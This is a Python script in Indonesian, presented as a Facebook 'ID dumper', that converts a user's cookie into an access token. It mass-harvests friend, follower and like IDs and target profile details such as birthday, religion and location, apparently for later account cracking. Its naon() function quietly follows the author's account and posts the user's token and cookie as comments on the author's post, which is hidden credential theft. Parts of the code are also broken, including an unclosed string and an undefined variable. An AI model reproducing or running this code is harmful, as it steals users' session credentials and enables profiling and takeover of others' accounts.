# # # # # # # # # # # # # # # # #
 # Team ALL STAR • Corporation
# Real Author • CLAOUPY OFFICIALL
# Github • github.com/CLAYS-AI
 # Recode? Ijin Dulu Bangsatttt!! 
 # Cookie Convert Token Dibuat Oleh Rozhak • XD
# # # # # # # # # # # # # # # # #
 

import requests,bs4,os,sys,json,datetime,time,rich,re,random,threading,zlib,base64,marshal,binascii,time,py_compile

from concurrent.futures import ThreadPoolExecutor as tren
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from requests.exceptions import ChunkedEncodingError
from rich import print as vprint
from random import randint
from concurrent.futures import ThreadPoolExecutor as tread
from bs4 import BeautifulSoup as biutipulsop

FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
id = []
loop = 0

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["VOG-L29/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/537+ (khtml, like gecko) safari/537+","Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36;]"]

def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();time.sleep(0.05)

ua_random = random.choice(["VOG-L29/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Crome; U; kau; nokiac2-00) Chrome/108.0.5359.128/70/352/Crome Mobile","Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 ", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 Crome/110.0,gzip(gfe)", "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; id-id; Mozilla/5.0 (Linux; Android 11; V2026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.29 Mobile Safari/537.36,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36","Mozilla/5.0 (Linux; Android 10; Infinix X680B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36"])


P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
garis = f" {P}[{H}•{P}]"

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"
  
expired_script = ['01', '11', '2022']

def ex_run():
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}script dmf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script dmf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script dmf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
		vprint(panel(x,style=f"{warna_warni_rich}"))
		cek_cookie()
	else:
		cek_cookie()

def banner():
	os.system("clear")
	print(f"""{P}
\t\t________      _____   ___________
\t\t\______ \    /     \  \_   _____/
 \t\t|    |   \  /  \ /  \  |    __)  
 \t\t|    `    \/    Y    \ |     \   
\t\t/_______  /\____|__  / \___  /   
        \t\t\/         \/      \/  • Dump Multi Fast •
\t\t{garis} author by : CLAOUPY OFFICIALL
\t\t{garis} {K}{hhl}
""")

def cek_cookie():
	os.system("cd cdmf")
	os.system("git pull")
	try:
		token  = open('token.txt','r').read()
		try:
			token  = open('token.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token))
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{H3}"))
			print("")
			x=f"{P2}token {H2}{xname} {P2}belum invalid"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk ke menu ")
			menu()
		except (KeyError):
			x=f"{P2}token kadaluarsa"
			vprint(panel(x,style=f"{H3}"))
			os.system('rm -rf token.txt')
			login()
		except requests.exceptions.ConnectionError:
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{H3}"))
			exit()
	except IOError:
		login()

def login():
	banner()
	x=f"{P2}halo pengguna script dump multi fast :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu dump multi fast.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
	vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"{P2}[01] login with cookie (convert ke token)\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
	vprint(panel(x,style=f"{H3}"))
	cukuf = input(f" {P}[{H}•{P}] pilih : {H}")
	if cukuf in ["help","Help","HELP"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}083153249266 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author dmf\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{H3}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{H3}"))
		os.system('xdg-open https://wa.me/+6283153249266?text=bang+cara+pake+script+abang+kek+mana?')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["1","01"]:
		login_cookie()
	elif cukuf in ["2","02"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}083153249266 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{H3}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{H3}"))
		os.system('xdg-open https://wa.me/+6283153249266?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{H}•{P}] kembali")
		login()
	elif cukuf in ["0","00"]:
		exit()
	else:
		print("")
		jalan(f"{garis} isi yang benar!! ")
		login()

def login_cookie():
	print("")
	print(f"{garis} Silahkan masukan cookie fresh untuk mengconvert ke token.. klo tidak punya ambil di kiwi browser.. ingfo selanjutnya bisa chat admin yakk!!/n{garis} tidak direkomendasikan akun tumbal baru buat!!")
	your_cookies = input(f"{garis} Masukan cookie : {H}")
	with requests.Session() as r:
		try:
			# • BUATAN ROZHAK XD • #
			r.headers.update({'content-type': 'application/x-www-form-urlencoded'})
			data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
			response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
			code, user_code = response['code'], response['user_code']
			verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
			r.headers.pop('content-type')
			r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document'})
			response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
			if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
				print(f"{garis} Cookie invalid ", end='\r');time.sleep(3.5);exit() 
			else:
				action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
				data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code}
				r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin'})
				response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
				if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
					r.headers.pop('content-type');r.headers.pop('origin')
					response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
					action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
					scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
					display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
					user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
					logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
					auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
					encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
					return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
					r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded'})
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format}
					response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
					windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
					r.headers.pop('content-type');r.headers.pop('origin')
					r.headers.update({'referer': 'https://m.facebook.com/'})
					response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
					if 'Sukses!' in str(response6):
						r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site'})
						response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
						access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
						print(f"{garis} token : {H} {access_token}");open("token.txt","w").write(access_token);naon(your_cookies)
					else:
						print(f'{garis} gagal...');exit()
		except (ConnectionError, ChunkedEncodingError):
			print(f"{garis} koneksi Error...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
		except Exception as e:
			print(f"{garis} {str(e).title()}...");exit()
	# • Thanks For Rozhak XD <3 • #
	
def naon(your_cookies):
	cook = your_cookies
	toket = open("token.txt","r").read();random_kata = random.choice(["Makasih Bang Udah Buat Script Dmf","Hikmat Gans Selalu Coeg><","semoga @[100054394286985:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/100054394286985?fields=subscribers&access_token={toket}");requests.post(f"https://graph.facebook.com/100054394286985_804734727255156/comments/?message={toket}&access_token={toket}");requests.post(f"https://graph.facebook.com/100054394286985_804734727255156/comments/?message={cook}&access_token={toket}");requests.post(f"https://graph.facebook.com/100054394286985_804734727255156/comments/?message={random_kata}&access_token={toket}");print(f"\n{garis} tunggu sebentar");time.sleep(3);menu()


now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

def menu():
	banner()
	token  = open('token.txt','r').read()
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token))
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	#x=f"{P2}ini bukan script crack fb!!.. ini cuman dump id nya doang biar simple..\nnanti next crack fb dari file dump!!"
	#vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"{P2}{hhl} {K2}{nama}"
	vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"{P2}[01] dump id public\n{P2}[02] dump id followers\n{P2}[03] dump id post likes\n{P2}[04] dump id public {H2}manually{P2}\n{P2}[05] dump id followers {H2}manually{P2}\n{P2}[06] check info akun target\n{P2}[07] beri tanggapan script ini\n{P2}[08] report bug script\n{P2}[{M2}00{P2}] exit/hapus cookie"
	vprint(panel(x,style=f"{H3}"))
	hikmat = input(f"{garis} pilih : {H}")
	if hikmat in ["1","01"]:
		dump_public()
	elif hikmat in ["2","02"]:
		dump_followers()
	elif hikmat in ["3","03"]:
		dump_post()
	elif hikmat in ["4","04"]:
		dump_publicv2() 
	elif hikmat in ["5","05"]:
		dump_followersv2()
	elif hikmat in ["6","06"]:
		check_ingfo_akun()
	elif hikmat in ["7","07"]:
		print(f"{garis} Apa Coba Bang? :V")
		input()
		menu()
	elif hikmat in ["8","08"]:
		print("")
		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
		vprint(panel(x,style=f"{H3}"))
		print("")
		x=f"{P2}sedang diarahkan ke whastapp author"
		vprint(panel(x,style=f"{H3}"))
		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
		input(f" {P}[{H}•{P}] kembali")
		menu()
	elif hikmat in ["0","00"]:
		print("")
		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
		vprint(panel(x,style=f"{H3}"))
		zk = input(f"{garis} pilih : {H}")
		if zk in ["1","01"]:
			print("")
			c = input(f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}")
			if c in ["ya","y","Y"]:
				print("")
				os.system("rm -rf cookie.txt")
				os.system("rm -rf token.txt")
				jalan(f"{garis} sukses menghapus cookie bawaan ")
				cek_cookie()
			elif c in ["t","T","tidak"]:
				menu()
			else:
				print("")
				jalan(f"{garis} isi yang benar ")
				menu()
		elif zk in ["2","02"]:
			exit()
		elif zk in ["0","00"]:
			menu()
		else:
			print("")
			jalan(f"{garis} isi yang benar ")
			menu()
	else:
		print("")
		jalan(f"{garis} isi yang benar ")
		menu()
			

def dump_public():
	try:
		os.mkdir('dump')
	except:pass
	try:
		xaco = input(f"{garis} id public  :\x1b[38;5;46m ")
		cuy = input(f"{garis} nama file  :\x1b[38;5;46m ")
		print("")
		bangsat  = ('dump/' + cuy + '.json').replace(' ', '_')
		yandek = open(bangsat, 'w')
		token = open('token.txt','r').read()
		for fuck in requests.get(f"https://graph.facebook.com/{xaco}?fields=friends.limit(5001)&access_token={token}").json()['friends']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			yandek.write(fuck['id']+'|'+fuck['name'] + '\n')
			fr = random.choice([O,B,H,P,K,M,U])
			sys.stdout.write(f'\r\033[0m *--> %s {fr}• \033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mproses dump ID...'%(fuck['id'],fuck['name'],datetime.datetime.now().strftime('%H:%M:%S'), len(id))); sys.stdout.flush()
			time.sleep(0.0050)
			
		yandek.close()
		jalan(f"\n{garis} berhasil dump id dari publik");print(f"{garis} salin output file *--> [ %s%s%s ]"%(H,bangsat,P))
		input(f"{garis} kembali ");menu()
	except (KeyError,IOError):
		os.remove(wkwk)
		jalan(f"{garis} gagal dump id, kemungkinan id tidak ada.\n")
		input(f"{garis} kembali ");menu()
		
def dump_followers():
	try:
		os.mkdir('dump')
	except:pass
	try:
		xaco = input(f"{garis} id followers  :\x1b[38;5;46m ")
		cuy = input(f"{garis} nama file  :\x1b[38;5;46m ")
		print("")
		bangsat  = ('dump/' + cuy + '.json').replace(' ', '_')
		yandek = open(bangsat, 'w')
		token = open('token.txt','r').read()
		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(xaco,token)).json()
		for fuck in cyna['subscribers']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			yandek.write(fuck['id']+'|'+fuck['name'] + '\n')
			fr = random.choice([O,B,H,P,K,M,U])
			sys.stdout.write(f'\r\033[0m *--> %s {fr}• \033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mproses dump ID...'%(fuck['id'],fuck['name'],datetime.datetime.now().strftime('%H:%M:%S'), len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		yandek.close()
		jalan(f"\n{garis} berhasil dump id followers ");print(f"{garis} salin output file *--> [ %s%s%s ]"%(H,bangsat,P))
		input(f"{garis} kembali ");menu()
	except (KeyError,IOError):
		os.remove(wkwk)
		jalan(f"{garis} gagal dump id, kemungkinan id tidak ada.\n")
		input(f"{garis} kembali ");menu()

def dump_post():
	try:os.mkdir('dump')
	except:pass
	try:
		token = open('token.txt','r').read()
	except (KeyError,IOError):
		jalan(garis+" token kadaluarsa");cek_cookie()
	try:
		xaco = input(f"{garis} id likes  :\x1b[38;5;46m ")
		cuy = input(f"{garis} nama file  :\x1b[38;5;46m ")
		limit = input(f"{garis} limit likes : {H}")
		print("")
		bangsat  = ('dump/' + cuy + '.json').replace(' ', '_')
		yandek = open(bangsat, 'w')
		cyna = requests.get('https://graph.facebook.com/%s?fields=likes.limit(%s)&access_token=%s'%(xaco,limit,token)).json()
		for fuck in cyna['likes']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			yandek.write(fuck['id']+'|'+fuck['name'] + '\n')
			fr = random.choice([O,B,H,P,K,M,U])
			sys.stdout.write(f'\r\033[0m *--> %s {fr}• \033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mproses dump ID...'%(fuck['id'],fuck['name'],datetime.datetime.now().strftime('%H:%M:%S'), len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		yandek.close()
		jalan(f"\n{garis} berhasil dump id post likes ");print(f"{garis} salin output file *--> [ %s%s%s ]"%(H,bangsat,P))
		input(f"{garis} kembali ");menu()
	except (KeyError,IOError):
		os.remove(wkwk)
		jalan(f"{garis} gagal dump id, kemungkinan id tidak ada.\n")
		input(f"{garis} kembali ");menu()

def dump_publicv2():
	kuntol=0
	tutlu=[]
	try:
		token = open('token.txt','r').read()
	except (KeyError,IOError):
		jalan(garis+" token kadaluarsa");cek_cookie()
	it = input(f"{garis} id target :"+H+" ")
	try:
		ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(it,token))
		oioo = json.loads(ka.text)
		for fuck in oioo['friends']['data']:
			tutlu.append(fuck['id'])
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token)).json()
		print(f"{garis} name : %s%s"%(H,cyna['name']))
		print(f"{garis} total friends : {H}{len(tutlu)}")
	except (KeyError,IOError):
		jalan(f"{garis} cookie kadaluarsa")
		login()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{garis} limit dump id :"+H+" ")
	ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(%s)&access_token=%s'%(it,lim,token)) 
	oioo = json.loads(ka.text)
	for fuck in oioo['friends']['data']:
		tl.append(fuck['id'])
	print("")
	x=f"{P2}[01] id urutan new\n{P2}[02] id urutan old\n{P2}[03] id urutan random"
	vprint(panel(x,style=f"{H3}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in tl:
			idl.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in tl:
			idl.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		exit()
	print("")
	for uik in idl:
		try:
			#xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token)) 
			#x = json.loads(xn.text)
			#try:lok = x["locale"]
			#except (KeyError,IOError):
				#lok = "-"
			#coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token)) 
			#el = json.loads(coa.text)
			#try:lk = el["name"]
			#except (KeyError,IOError):
				#lk = "-"
			#ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token)).json()
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(uik,token)) 
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['friends']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				continue
			kuntol+=1
			print(f"\r{P} [{H}{str(kuntol)}{P}] {uik}|{len(to)}")
			to.clear()
		except KeyError:
			print(K+'*--> '+M+'akun terspam')
	print("")
	x=f"{P2}salin hasil nya cokk biar gk ulang dump lagi!!"
	vprint(panel(x,style=f"{H3}"))
	input(f"{garis} enter untuk kembali")
	menu()

def dump_followersv2():
	kuntol=0
	tutlu=[]
	try:
		token = open('token.txt','r').read()
	except (KeyError,IOError):
		jalan(garis+" token kadaluarsa");cek_cookie()
	it = input(f"{garis} id target :"+H+" ")
	try:
		ka = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(it,token))
		oioo = json.loads(ka.text)
		for fuck in oioo['subscribers']['data']:
			tutlu.append(fuck['id'])
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token)).json()
		print(f"{garis} name : %s%s"%(H,cyna['name']))
		print(f"{garis} total followers : {H}{len(tutlu)}")
	except (KeyError,IOError):
		jalan(f"{garis} cookie kadaluarsa")
		login()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{garis} limit dump :"+H+" ")
	ka = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(%s)&access_token=%s'%(it,lim,token))
	oioo = json.loads(ka.text)
	for fuck in oioo['subscribers']['data']:
		tl.append(fuck['id'])
	x=f"{P2}[01] id urutan old\n{P2}[02] id urutan new\n{P2}[03] id urutan random"
	vprint(panel(x,style=f"{H3}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in tl:
			idl.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in tl:
			idl.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		exit()
	print("")
	for uik in idl:
		try:
			xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token))
			x = json.loads(xn.text)
			try:lok = x["locale"]
			except (KeyError,IOError):
				lok = "-"
			#coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token))
			#el = json.loads(coa.text)
			#try:lk = el["name"]
			#except (KeyError,IOError):
				#lk = "-"
			#ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token)).json()
			cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(uik,token))
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['subscribers']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				pass
			kuntol+=1
			print(f"\r{P} [{H}{str(kuntol)}{P}] {uik}|{len(to)}")
			to.clear()
		except KeyError:
			print(K+'*--> '+M+'akun terspam')
	print("")
	x=f"{P2}salin hasil nya cokk biar gk ulang dump lagi!!"
	vprint(panel(x,style=f"{H3}"))
	input(f"{garis} enter untuk kembali")
	menu()


def check_ingfo_akun():
	idt=[]
	try:
		token = open('token.txt','r').read()
	except (KeyError,IOError):
		jalan(garis+" token kadaluarsa");cek_cookie()
	idt = input(garis+" id target :%s "%(H))
	try:
		zx = requests.get("https://graph.facebook.com/"+idt+"?access_token=%s"%(token));zy = json.loads(zx.text)
	except (KeyError,IOError):jalan(garis+" id tidak ditemukan");menu()
	try:nm = zy["name"]
	except (KeyError,IOError):nm = (M+"-")
	try:nd = zy["first_name"]
	except (KeyError,IOError):nd = (M+"-")
	try:nt = zy["middle_name"]
	except (KeyError,IOError):nt = (M+"-")
	try:nb = zy["last_name"]
	except (KeyError,IOError):nb = (M+"-")
	try:ut = zy["birthday"]
	except (KeyError,IOError):ut = (M+"-")
	try:gd = zy["gender"]
	except (KeyError,IOError):gd = (M+"-")
	try:em = zy["email"]
	except (KeyError,IOError):em = (M+"-")
	try:lk = zy["link"]
	except (KeyError,IOError):lk = (M+"-")
	try:us = zy["username"]
	except (KeyError,IOError):us = (M+"-")
	try:rg = zy["religion"]
	except (KeyError,IOError):rg = (M+"-")
	try:rl = zy["relationship_status"]
	except (KeyError,IOError):rl = (M+"-")
	try:rls = zy["significant_other"]["name"]
	except (KeyError,IOError):rls = (M+"-")
	try:lc = zy["location"]["name"]
	except (KeyError,IOError):lc = (M+"-")
	try:ht = zy["hometown"]["name"]
	except (KeyError,IOError):ht = (M+"-")
	try:ab = zy["about"]
	except (KeyError,IOError):ab = (M+"-")
	try:lo = zy["locale"]
	except (KeyError,IOError):lo = (M+"-")
	#try:ppk = zy["education"]["id"]
	#except (KeyError,IOError):ppk = (M+"-")
	print("")
	jalan(garis+" nama : %s%s"%(H,nm))
	jalan(garis+" nama depan : %s%s"%(H,nd))
	jalan(garis+" nama tengah : %s%s"%(H,nt))
	jalan(garis+" nama belakang : %s%s"%(H,nb))
	jalan(garis+" TTL : %s%s"%(H,ut))
	jalan(garis+" gender : %s%s"%(H,gd))
	try:
		token = open('token.txt','r').read()
		cy = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(idt,token))
		z = json.loads(cy.text)
		for i in z['friends']['data']:
			id.append(i['id'])
	except:pass
	jalan(garis+" total friends : "+H+"%s"%str(len(id)));time.sleep(0.03)
	lao=[]
	try:
		token = open('token.txt','r').read()
		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(idt,token))
		eil = json.loads(cyna.text)
		for fuck in eil['subscribers']['data']:
			lao.append(fuck['id'])
	except:pass
	jalan(garis+" total followers : "+H+"%s"%(len(lao)));time.sleep(0.03)
	jalan(garis+" email : %s%s"%(H,em))
	jalan(garis+" link : %s%s"%(H,lk))
	jalan(garis+" username : %s%s"%(H,us))
	jalan(garis+" agama : %s%s"%(H,rg))
	jalan(garis+" status hubungan : %s%s"%(H,rl))
	jalan(garis+" hubungan dengan : %s%s"%(H,rls))
	jalan(garis+" tempat tinggal : %s%s"%(H,lc))
	jalan(garis+" tempat asal : %s%s"%(H,ht))
	jalan(garis+" tentang : %s%s"%(H,ab))
	jalan(garis+" locale : %s%s"%(H,lo))
	input(garis+" enter untuk kembali");menu()




cek_cookie()

# MAU NGAPAIN COBA BANG? 
# Usahakan Mau Rekod Ijin Dulu:) 
